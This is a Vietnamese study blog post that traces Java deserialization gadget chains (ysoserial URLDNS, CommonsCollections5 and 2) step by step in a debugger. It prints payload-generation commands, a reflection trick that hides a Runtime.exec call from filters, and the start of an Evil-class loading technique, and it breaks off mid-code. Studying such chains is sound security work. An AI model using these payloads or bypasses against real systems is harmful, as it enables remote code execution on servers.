---
title: "Java security"
excerpt: "October 23, 2021 04:00 PM ICT to October 27, 2021 04:00 PM ICT"

header:
show_date: true
header:
  teaser: "../assets/images/images-icon/java.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/java.jpg" alt="">
</p>

# java security


Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d

Cài đặt môi trường:

+ IntelliJ - ide để chạy và debug java
+ java enviroment để chạy java


Mở ide -> tạo project mới -> gen ra:

![image](https://hackmd.io/_uploads/HkhmZTcnA.png)

ở trên là cấu trúc cây thư mục của 1 dự án java spring boot web cơ bản theo mô hình mvc flow từ controller -> service -> view để tương tác với người dùng.

Tất cả controller sẽ được gói vào controller của main.


#1 java Reflection


Đây là một tính năng trong java cho phép truy cập các thông tin của đối tượng (tên class, các field, methods) và chỉnh sửa các field của đối tượng(kể cả các field private) trong quá trình runtime.

Trong security thì java reflection được dùng để bypass filter/sanbox hay dỳng để lấy và thay đổi các giá trị của các field của gadget chain trong bug java deserialization.

#1.1 Bypass filter

Ví dụ ta có một target có thể eval các code java nhập vào thông thường sẽ gọi Runtime.getRuntime().exec(cmd) để chạy lệnh như dưới đây:

```
public String demoVul(){
        System.out.println("Every seem ok!!!");
        try {
            // Process process = Runtime.getRuntime().exec("whoami");
            Process process = (Process) String.class.getClass()
                    .forName("java.l" + "ang.Ru" + "ntime")
                    .getMethod("exe" + "c", String.class)
                    .invoke(
                            String.class.getClass()
                                    .forName("java.l" + "ang.Ru" + "ntime")
                                    .getMethod("getRu" + "ntime")
                                    .invoke(
                                            String.class.getClass()
                                                    .forName("java.l" + "ang.Ru" + "ntime")),
                            "whoami");

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            System.out.println(reader.readLine());

        } catch (ClassNotFoundException | NoSuchMethodException | InvocationTargetException | IllegalAccessException |
                 IOException e) {
            e.printStackTrace();
        }

        return "OK";
    }
```

Đoạn code trên -> chỉ kể đến đoạn comment thì chỉ đơn giản là chạy và in ra kết quả của whoami cmd 

Nếu Runtime exec bị chặn thì sao -> ta sẽ dùng các method khác nhưng nếu Runtime exec đã bị chặn thì các hàm liên quan cũng hầu hết chết -> lúc này ta sẽ dùng java reflection 

Như ở đoạn code trên ta có thể thấy ta sẽ dùng các reflection API, như getClass(), getMethod(), forName() và invoke()

Chú ý: java.lang.Class là một entrypoint của mọi thao tác reflection Api hiểu nôm na nó là cội nguồn của mọi class nằm trong java -> tất cả class đều có liên quan đến nó

-> trong java ta có 2 cách để lấy java.lang.Class object:


Cách 1: sử dụng Object.getClass() -> phương thức này sẽ trả về runtimeClass object type

Cách 2: sử dụng .class -> className.class trả về class object static


#2 java deserialize

deserialize là một chủ đề nóng trong lĩnh vực bảo mật -> gần như là mọi ngôn ngữ lập trình đều có các phương pháp tựa nhau để implement serialize  -> deserialize

Nó thường là một rủi ro bảo mật vì -> tất cả các ngôn ngữ thường cần truyền thông tin trên mạng hoặc qua lại với nhau -> nó thường dùng các loại như json hoặc xml

ở trên là các định dạng dữ liệu phổ biến được sử dụng trong tương tác dữ liệu

Vấn đề là nếu dữ liệu phức tạp hơn thì khó có thể truyền tải được

Với trường hợp ta muốn truyền tải một class Person bao gồm tên + tuổi + method ... thì ta cần sử dụng serialize và deserialize



## Option1 URLDNS  
genpayload: `java -jar ysoserial-all.jar URLDNS "http://e3t352l0.requestrepo.com" | base64 -w0`

Chain này bao gồm các thành phần như sau:

```
  HashMap.readObject()
    HashMap.hash()
      URL.hashCode()
        URLStreamHandler.hashCode()
          URLStreamHandler.getHostAddress()
            InetAddress.getByName()
```

Gadget chain này tồn tại bên trong runtime.jar của java -> mục đích cuối cùng của nó là tạo 1 request dns lookup tới domain tùy úy -> kiểm tra xem targer có thể deserialize obj này được hay không


* Tiến hành tìm hiểu các gadget chain -> ta sẽ chọn HashMap.java

![image](https://hackmd.io/_uploads/rJxihKThA.png)


-> tìm đến method readObject

```
private void readObject(ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        reinitialize();

        ObjectInputStream.GetField fields = s.readFields();

        // Read loadFactor (ignore threshold)
        float lf = fields.get("loadFactor", 0.75f);
        if (lf <= 0 || Float.isNaN(lf))
            throw new InvalidObjectException("Illegal load factor: " + lf);

        lf = Math.min(Math.max(0.25f, lf), 4.0f);
        HashMap.UnsafeHolder.putLoadFactor(this, lf);

        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0) {
            throw new InvalidObjectException("Illegal mappings count: " + mappings);
        } else if (mappings == 0) {
            // use defaults
        } else if (mappings > 0) {
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
```

-> sau khi navigate đến nó ta cần tìm mã mà nó có gọi đến chain tiếp theo như ở trên ta nói là gọi đến hash() đó là putVal `putVal(hash(key), key, value, false, false);` bắt đầu đặt break point tại đây.

Trước khi đó ta có thể thấy object đã được deserialize thành công và gadget chain đã dẫn đến source :

![image](https://hackmd.io/_uploads/HyxDAFpnA.png)


Sau khi thực hiện run với mode debug ->

![image](https://hackmd.io/_uploads/B1PfZqThR.png)


Note:

Ta có thể thấy các thành phần đó là:

Project file: đây là cửa sổ show các file data ra -> sau khi chạy chương trình sẽ load nguồn từ đây

Detail code: là cửa sổ show mã code chính của file tương tự như vs code

project library: là nơi hiển thị danh sách các libs cho project hiện tại

stack trace: đây là nơi sẽ hiển thị các backtrace -> hay nói cách khác là nó hiển thị danh sách mà các method đã được gọi đến trước khi đi vào b* của chúng ta

local variables: hiển thị tất cả các biến -> để giúp cho quá trình debug dễ dàng.

Ngoài ra thì ở detail code cũng hiển thị các biến ở từng dòng:

![image](https://hackmd.io/_uploads/HyUpQ9630.png)

có thể thấy ở đây:
![image](https://hackmd.io/_uploads/BJ3gr5ThR.png)

putVal sẽ nhận 5 đối số lúc nào key và value đều có giá trị là `http://e3t352l0.requestrepo.com` còn arg1 là hash(key)

- đến với mehthod hash ta có thể thấy nó xử lí như sau:

```
 static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

nhận giá trị là một object key sau đó kiểm tra key == null hay không thì trả ra 0 nếu đúng còn nếu không thì nó lại trả ra `(h = key.hashCode()) ^ (h >>> 16)` và ở đây key.hashCode() được gọi đến ->

![image](https://hackmd.io/_uploads/HkSpUqT2C.png)


Có thể thấy nó như thế này:

```
public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

```
 private void resetState() {
        this.protocol = null;
        this.host = null;
        this.port = -1;
        this.file = null;
        this.authority = null;
        this.ref = null;
        this.hashCode = -1;
        this.handler = null;
        this.query = null;
        this.path = null;
        this.userInfo = null;
        this.tempState = null;
    }
```

`private int hashCode = -1;`

Nó sẽ kiểm tra xem có giá trị hashCode nào được cache hay không -> check nếu hashCode != 1 sẽ trả về luôn còn ngược lại thì gọi `handler.hashCode(this)` và để có thể chain được thì yêu cầu nó phải có giá trị bằng -1

Đây là lúc ta sử dụng java Reflection để set lại giá trị private này:


```
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```

Đây là mã chain trong yoserial-all.jar nó sẽ thực hiện điều này bằng cách khai báo một URL u `URL u = new URL(null, url, handler);` -> khai báo một ht là hashMap `HashMap ht = new HashMap();` -> put u vào trong ht -> gọi đến `Reflections.setFieldValue(u, "hashCode", -1)` ở đây ta có thể thấy nó set lại giá trị của hashCode bằng -1 để có thể nhảy đến gadget `hashCode = handler.hashCode(this);`

![image](https://hackmd.io/_uploads/HkIBoqT2A.png)

Sau khi put URL obj vào ht, HashMap sẽ thay đổi giá trị của trường giá trị hashCode của URL thành giá trị mới khác -1 nên chương trình sẽ không nhảy vào đường "bóng" mà chúng ta yêu cầu -> vì vậy ngay sau đó sẽ dùng `Field f1 = <Some Class>.getDeclaredField(<Field Name>);` đây `<Some Class>` chúng ta có thể là URL.class hoặc gián tiếp như `Class.forName(“java.net.URL”)` như trong bài java reflection đã được đề cập đến

Do trường hashCode được khai báo với dạng private cho nên ta không thể thao tác trực tiếp ngay với nó được mà phải `f1.setAccessible(true);`

-> sau đó thì ta đã có thể set giá trị cho nó mặc dù nó được khai báo private `f1.set(u, -1)`

f1 là trường hashCode của class URL 1 LÀ object của class URL, -1 là giá trị cần set

![image](https://hackmd.io/_uploads/H1gOkjTnA.png)

Tiếp theo sau đó:
![image](https://hackmd.io/_uploads/HJC1Wiph0.png)

handler được khai báo như trên là một obj từ class `URLStreamHandler` ! Đặc điểm của transient field này là khi serialize, nó không được serialize cùng object!

-> đi vào tìm hashCode của `URLStreamHandler`


```
protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase().hashCode();
        }

        // Generate the file part.
        String file = u.getFile();
        if (file != null)
            h += file.hashCode();

        // Generate the port part.
        if (u.getPort() == -1)
            h += getDefaultPort();
        else
            h += u.getPort();

        // Generate the ref part.
        String ref = u.getRef();
        if (ref != null)
            h += ref.hashCode();

        return h;
    }
```


![image](https://hackmd.io/_uploads/rk1nMi620.png)


Để ý `InetAddress addr = getHostAddress(u);` getHostAddress sẽ nhận url là host là key mà ta truyền vào 

``
  protected InetAddress getHostAddress(URL u) {
        return u.getHostAddress();
    }
``



![image](https://hackmd.io/_uploads/ryPNNiThA.png)


`hostAddress = InetAddress.getByName(host);` sẽ gọi đến method `getByName` với arg là host


![image](https://hackmd.io/_uploads/rJn94iT30.png)


và đây chính là sink của gadgetchain này mà chúng ta hướng đến thực hiện resolve dns với domain ta truyền vào.


## common colection5

`java -jar ysoserial-all.jar CommonsCollections5 "calc.exe" | base64 -w0`

- ở gadget này ta vẫn rce được nhưng thông qua các chain ở lib khác


/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
 
 
 Có thể thấy ở đây đi từ BadAttributeValueExpException đến sink là Method.invoke -> ta cùng debug để xem qua trình run của nó
 
 Như anh tác giả tsug0d và anh Jang đã nói về chain này

```
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
```

Nếu ta đặt break point tại `val = valObj.toString();` thì sẽ pop up calc lên luôn vậy tại sao lại xảy ra điều đó khi ta chưa chạy đến sink của gadget là Method.invoke để reflection -> RCE.

-> do đây là một tính năng của IntelliJ debugger:

-> khi dừng lại 1 b* của trình debbugger thì ide sẽ cố gắng lấy tất cả giá trị của các biến trước khi đến b*  -> nó sẽ nhận dữ liệu đầu vào dưới dang object và khả năng muốn chuyển thành string để người dùng có thể đọc -> vì vậy nó đã ngầm invoke method toString -> lúc này các chain ở đẳng sau sẽ tự động gadget vào luôn.

Do đó nên ta sẽ đi tìm nơi đặt b* khác để không bị pop up calc trước khi đến sink ta sẽ tìm b* ở class khác của gadget

![image](https://hackmd.io/_uploads/HyLa7wgpA.png)


Trước tiên thì phân tích trước -> method sẽ nhận ois là obj của ObjectInputStream

sau đó check điều kiện để vào if -> gọi method toString();
 
![image](https://hackmd.io/_uploads/rJ5WyFxaR.png)

có thể thấy valObj này khởi tạo từ TiedMapEntry -> đi vào class và tìm đến toString:

![image](https://hackmd.io/_uploads/rkNC1Kg6C.png)

ở đây sẽ trả về chuỗi là kết quả của 2 method

![image](https://hackmd.io/_uploads/ByGzeKlpC.png)

nếu ta đặt b* tại toString thì vẫn dính invoke toString của IntelliJ và pop up calc đo đó nếu ta đặt b* trong 2 method trên sẽ bị -> bây giờ ta sẽ tìm chain của nó

Tại

```
    public Object getValue() {
        return this.map.get(this.key);
    }
```

-> là method từ class LazyMap

![image](https://hackmd.io/_uploads/rJ_hbtepC.png)


Khi đặt b* ở class này thì calc không bị pop up trước nữa -> tiếp tục quan sát các biến local

Tại đây sẽ kiểm tra nếu chưa có key thì tiến hành gọi `Object value = this.factory.transform(key);` sau đó put kết quả trả về theo từng key

![image](https://hackmd.io/_uploads/SkrAmYxaA.png)

thằng `iTransformers` là một array được khai báo trong class ChainedTransformer

![image](https://hackmd.io/_uploads/B17yBYgTA.png)

Method transform ở đây:

![image](https://hackmd.io/_uploads/Sk3zHKxT0.png)


nó sẽ thực hiện duyệt đến hết mảng iTransformers sau đó với mỗi giá trị class trong mảng tiếp tục gọi method transfrom đó với từng class trong mảng này

![image](https://hackmd.io/_uploads/HkNhHFxTA.png)

Đối với payload common 5 sẽ có 5 phần tử -> vòng lặp đầu tiên:

![image](https://hackmd.io/_uploads/S1b0ItxpC.png)

method ở đây chỉ trả về `iConstant` tức là ![image](https://hackmd.io/_uploads/B1GbDFepC.png)

Vậy ở đây không có method nào để lợi dụng

Lòng lặp thứ 2:

![image](https://hackmd.io/_uploads/ryCFdtxT0.png)


class lúc này là getMethod 

![image](https://hackmd.io/_uploads/r1i3_tgT0.png)


input của ta lúc này chắc chắn khác null để ý:

```
 Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
```

khởi tạo một obj từ Class sau đó gán cho obj method từ Method giá trị getMethod -> trả về method.invoke giá trị input của ta -> Đây là chain cuối để lead to RCE

![image](https://hackmd.io/_uploads/rkx0ttx6C.png)


input là class java.lang.Runtime cls lúc này là class java.lang.Class như được khởi tạo 

![image](https://hackmd.io/_uploads/SkUEqYgaC.png)

Có thể thấy điểm khác lạ ở đây thì input là class của java chứ không phải là do người dùng tạo -> đối với cách dùng hợp lí thì input sẽ là của một class do người dùng định nghĩa

Ví dụ như: input là 1 object của class HashMap(). Khi thực thi đoạn code trên, input.getClass() sẽ tương tự như thực thi HashMap.getClass() và trả về class HashMap()

tiếp tục đoạn khởi tạo method từ Method gọi Class.getMethod("getMethod", …) và getMethod() này sẽ trả về method getMethod() của class Class trong java không phải người dùng tạo -> cuối cùng thì ta invoke nó


### Phân tích chi tiết debugger phần chain lead to RCE tại class InvokerTransformer


Như đã nói ở trên thì tại class ChainedTransformer sẽ có 1 vòng for duyệt qua mảng 

![image](https://hackmd.io/_uploads/H1a5SNWTC.png)

ở đây chúng ta có thể thấy mảng này sẽ là mảng các obt tạo từ class tại Transformer.


```
 public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
```

tương tự ở phía trên ta có thấy method transfrom ở đây được gọi với tham số là Object object được truyền vào lúc này giá trị của object là "foo"

![image](https://hackmd.io/_uploads/BJpDLNZTC.png)

Mảng iTransformers trong gadget này gồm có 5 phần tử như sau:

![image](https://hackmd.io/_uploads/HkfCUNb6C.png)

![image](https://hackmd.io/_uploads/r1IGOVbTR.png)


* loop1: i = 0 ; object = "foo"; this.iTransformers[i] có key "iConstant" có giá trị là "class java.lang.Runtime"

lúc này object được gán lại bằng `this.iTransformers[i].transform(object);`

Với các giá trị ở trên thì this.iTransformers[i] là obj của class `ConstantTransformer` -> nó gọi transform với tham số là input -> lúc này là object ta đã truyền vào với giá trị ở trên
Method này chỉ đơn giản trả về giá trị của key iConstant là `"class java.lang.Runtime"`

*loop2: i = 1; object lúc này có giá trị là `class java.lang.Runtime` được trả ra ở trên, lúc này this.iTransformers[i] là object với các key và value như sau:

![image](https://hackmd.io/_uploads/SJRjNS-60.png)

Có thể quan sát được giá trị được ida liệt kê như dưới:

![image](https://hackmd.io/_uploads/HJXGSB-T0.png)

Khi gọi method transform ở class `InvokerTransformer`

![image](https://hackmd.io/_uploads/HJ4_HSZTR.png)

Đối với method này nhận obj input là giá trị được nói ở trên và chắc chắn nó khác null nên sẽ vào khối lệnh try catch ở dưới

Lúc này một obj cls được khởi tạo theo class Class và được gán giá trị là input.getClass()

Đặt b* và giá trị lúc này của nó sẽ là:

![image](https://hackmd.io/_uploads/ByQDLHZ6C.png)

Chạy qua b* ta có giá trị cls là:

![image](https://hackmd.io/_uploads/S1hcUB-a0.png)

Tiếp tục khởi tạo một obj method từ class Method và gán giá trị là cls.getMethod với tham số `this.iMethodName, this.iParamTypes`

Gía trị của chúng như ở dưới:

![image](https://hackmd.io/_uploads/HyOePrZpC.png)

![image](https://hackmd.io/_uploads/SyISDrWTC.png)

Trong java thì tất cả các class đều là obj con của class Class

Do đó khi mà gọi getClass sẽ trả ra java.lang.class

Bình thường thì kiểu sẽ gọi:
```
Runtime input = Runtime.getRuntime();
Class cls = input.getClass();
System.out.println(cls);  // java.lang.Runtime

```
Thêm một ví dụ nữa là:
```
String input = "l3mnt2010";
Class cls = input.getClass();
System.out.println(cls);  // java.lang.String

```

Vậy đối với trường hợp này có gì khác -> input là một obj của Class chứ không phải object thông thường

Khi thực hiện gọi input.getClass sẽ trả về class Class():

![image](https://hackmd.io/_uploads/BkJ5yLWTC.png)


Đến với ``Method method = cls.getMethod(this.iMethodName, this.iParamTypes);`` ở đây class sẽ tưởng tự Class.getMethod

với 2 tham số 

![image](https://hackmd.io/_uploads/B1dLlUWpC.png)

![image](https://hackmd.io/_uploads/BkFtlUba0.png)

Tại đây method sẽ là class Method do ta đã dùng method getMethod với nameMethod được truyền vào từ class Class để nhận lại method getMethod như hình ta đã đề cập ở trên.

Tiếp theo sẽ trả về method.invoke(input, this.iArgs)

![image](https://hackmd.io/_uploads/ByvzmU-6A.png)

iArgs lúc này là mảng có 1 phần tử có giá trị là chuỗi "getRuntime"

input thì vẫn là class java.lang.Runtime


tìm hiểu một chút về method invoke

![image](https://hackmd.io/_uploads/BkItmLW60.png)

Nó có tác dụng là gọi(thực thi phương thức được truyền trong arg) với tham số là mảng chứa chuỗi "getRuntime".

*loop3: với i = 2, giá trị object được gán lại với giá trị class:

![image](https://hackmd.io/_uploads/SkZA4U-aR.png)

Có thể thấy kết quả giá trị trả về của invoke ở loop2 ở đây

Tiếp tục đi vào for lần này thì vẫn cùng class với loop2 mỗi tội khác arg thôi

![image](https://hackmd.io/_uploads/HJc8SIZpR.png)


Đoạn này ở loop trước đã giải thích nhiều nên ta chỉ lướt nhanh.

Class cls sẽ có giá trị là class java.lang.reflect.Method -> tiếp tục đến với Method methof sẽ gọi getMethod method name là invoke

![image](https://hackmd.io/_uploads/BJyMI8baC.png)
 giá trị method sẽ được trả ra là method invole của java.lang.reflect.Method.invoke
 
 Đi xuống return sẽ gọi method này với tham số trống
 
 *loop4: với i = 3, giá trị object được gán lại và gọi transform với name method exec:

![image](https://hackmd.io/_uploads/rkWsDUW6C.png)


Method lúc này sẽ là exec:

![image](https://hackmd.io/_uploads/B16pwU-6A.png)


Tiếp tục gọi invoke method này với tham số là calc.exe -> kết quả là gọi Runtime của java -> pop up calc.exe và trả về giá trị 1 process

*loop5: i = 4, giá trị obj được trả về và set ở trên

![image](https://hackmd.io/_uploads/S18hdUbpC.png)

lúc này method transform vẫn tiếp tục được gọi lần này sẽ nhảy vào `ConstantTransformer` và lấy ra giá trị iContant như ở loop1 và giá trị này sẽ là 1 được trả ra -> cuối cùng object được gán là 1

![image](https://hackmd.io/_uploads/HkJUYLZ60.png)

Trở về `TiedMapEntry`:


![image](https://hackmd.io/_uploads/S1weiUWaA.png)

getValue sẽ trả ra giá trị 1

toString trả ra chuỗi `foo=1`

Quay lại với class `BadAttributeValueExpException` 


```
val = valObj.toString();
```
val sẽ có giá trị là chuỗi ở trên và trả ra ngoài nhưng không phù hợp với Class được yêu cầu deserialize nên sẽ trả ra exception


Vậy là ta đã phân tích xong common colection 5, thank you 


## common clection 2

`java -jar ysoserial-all.jar CommonsCollections2 "calc.exe" | base64 -w0`

Các gadget chain của payloay:
```
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
```

project.iml

```
<?xml version="1.0" encoding="UTF-8"?>
<module type="JAVA_MODULE" version="4">
  <component name="NewModuleRootManager" inherit-compiler-output="true">
    <exclude-output />
    <content url="file://$MODULE_DIR$">
      <sourceFolder url="file://$MODULE_DIR$/src" isTestSource="false" />
    </content>
    <orderEntry type="jdk" jdkName="1.8" jdkType="JavaSDK" />
    <orderEntry type="sourceFolder" forTests="false" />
    <orderEntry type="library" name="commons-collections4-4.0" level="project" />
  </component>
</module>
```

Mình đã test thử các phiên bản jdk thì có bản 1.7 trở xuống bảng 1.9 trở lên cho đến các bản jdk 11 và mình có test jdk 19, 21, 22 thì không thể thực hiện được deserialize với gadget này

Trước khi đi vào phân tích ta sẽ đi qua một số thông tin qua 1 số concept -> ClassLoader#defineClass, TemplatesImpl, Javasist.

### Javasist( Java programming Assistant)

thông tường ta sẽ compile .java thành .class để chạy java -> sử dụng javac để compile bằng command line -> sử dụng bytecode (.class) được gen bởi compilaration để chạy trên JVM -> mỗi class này chứa java class và interface

Javasist là một thư viện để sử lí bytecode -> có thể chỉnh sửa byte code của file class.

các method thường được dùng:
ClassPool là một container của CtClass objects từ đó có thể lấy được CtClass, bằng các gọi đến ClassPool.getDefault().

![image](https://hackmd.io/_uploads/Sy4wTTG6C.png)

pool có kiểu class là ClassPool được gán giá trị là ClassPool.getDefault();

Có thể thấy method này như sau:

```
public static synchronized ClassPool getDefault() {
        if (defaultPool == null) {
            defaultPool = new ClassPool((ClassPool)null);
            defaultPool.appendSystemPath();
        }

        return defaultPool;
    }
```

nó sẽ tạo một classPool mới -> gọi appenSytemPath() sau đó trả ra obj này -> do đó nó sẽ trả về một default classPool vì nó truyền tham số là null -> nó sẽ tìm những system class path là đường dẫn đến các object trong thư mục

![image](https://hackmd.io/_uploads/BySRJ0faC.png)

-> theo sau đó mình cung cấp class path của object hiện tại cho nó, nếu mà server chạy trên Jboss hoặc tomcat của user thông thường thì chương tringh sẽ không tìm thấy nó và chúng ta cần phải dùng `pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));` để nó có thấy xác định chính xác

`CtClass EvilClass = pool.makeClass("Evil");` tạo một class có tên là Evil -> nó sẽ kế thừa các thuộc tính ` EvilClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));` -> tạo một static contructor `CtConstructor constructor = test.makeClassInitializer();`

Insert byte code ở begin của class `constructor.insertBefore("System.out.println(\"Hello,Javasist\");");`

Sau khi chạy thì sẽ tạo một class là Evil ở classpath

![image](https://hackmd.io/_uploads/HyqvZ0zpR.png)

Vậy chúng ta có thể viết class mới -> vậy làm sao để có thể gọi và chạy nó theo ý của ta. Câu trả lời ở dưới ->

### ClassLoader#defineClass

ClassLoader::defineClass có thể chạy một class từ mảng bytes

``` java
protected final Class<?> defineClass(byte[] b, int off, int len)
        throws ClassFormatError
    {
        return defineClass(null, b, off, len, null);
    }
```

vì đây là protected nên chúng ta cần phải sử dụng reflection api để access đến nó.

`  Class getClass = Class.forName("java.lang.ClassLoader");//get Classloader` dùng class.forName để lấy ra classLoader

Lấy ra method ` Method getMethod = getClass.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);//get method`  chuyển đổi access to private method là `getMethod.setAccessible(true);//access private method`

Cuối cùng invoke class Evil `Class invoker = (Class) getMethod.invoke(ClassLoader.getSystemClassLoader(),"Evil",bytes,0,bytes.length);` với các args và câu lệnh sẽ được chạy

![image](https://hackmd.io/_uploads/HyDvv0zTR.png)

### TemplatesImpl

full path: `import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`;

Ta có thể thấy có class `TransletClassLoader`:

``` java
 static final class TransletClassLoader extends ClassLoader {

        private final Map<String,Class> _loadedExternalExtensionFunctions;

        TransletClassLoader(ClassLoader parent) {
            super(parent);
            _loadedExternalExtensionFunctions = null;
        }

        TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
            super(parent);
            _loadedExternalExtensionFunctions = mapEF;
        }

        public Class<?> loadClass(String name) throws ClassNotFoundException {
            Class<?> ret = null;
            // The _loadedExternalExtensionFunctions will be empty when the
            // SecurityManager is not set and the FSP is turned off
            if (_loadedExternalExtensionFunctions != null) {
                ret = _loadedExternalExtensionFunctions.get(name);
            }
            if (ret == null) {
                ret = super.loadClass(name);
            }
            return ret;
        }

        /**
         * Access to final protected superclass member from outer class.
         */
        Class defineClass(final byte[] b) {
            return defineClass(null, b, 0, b.length);
        }
    }
```

ở đây thì có 1 class defineClass y hệt như cái ta nói ở trên -> tương tự thì chúng ta sẽ có thể gọi đến defineClass như sau:


`new TransletClassLoader(anyany.class.getClassLoader()).defineClass(bytes)`

![image](https://hackmd.io/_uploads/r1_KP1mTR.png)

Quan sát ở đây ra vẫn có defineClass nhưng mà của object class
```
 TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });
```


và mục đích ta cũng sẽ gọi đến method defineClass của gadget trên qua method defineClass của nó với tham số là _bytecode[i]

để ý đây là một private field của class TemplatesImpl do đó ta muốn access vào cần phải sử dụng java reflection. Nhưng trước tiên ta cần tìm gadget để gọi đến nó:

 ở đây ta sẽ dùng:


```
private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
```

getTransletInstance cí method newwInstance sẽ match với source ta test ở trên -> thực thi code trong evil class.

Điều kiện set _name != null và _class = null -> ta dùng reflectAPI để set lại value cho chúng

Cuối cùng để trigger đến gadget trên thì ta cần dùng:

![image](https://hackmd.io/_uploads/BJqi9kQ60.png)

``` java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;

import java.lang.reflect.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class TestClassLoader {

    public static void main(String[] args) throws Exception{

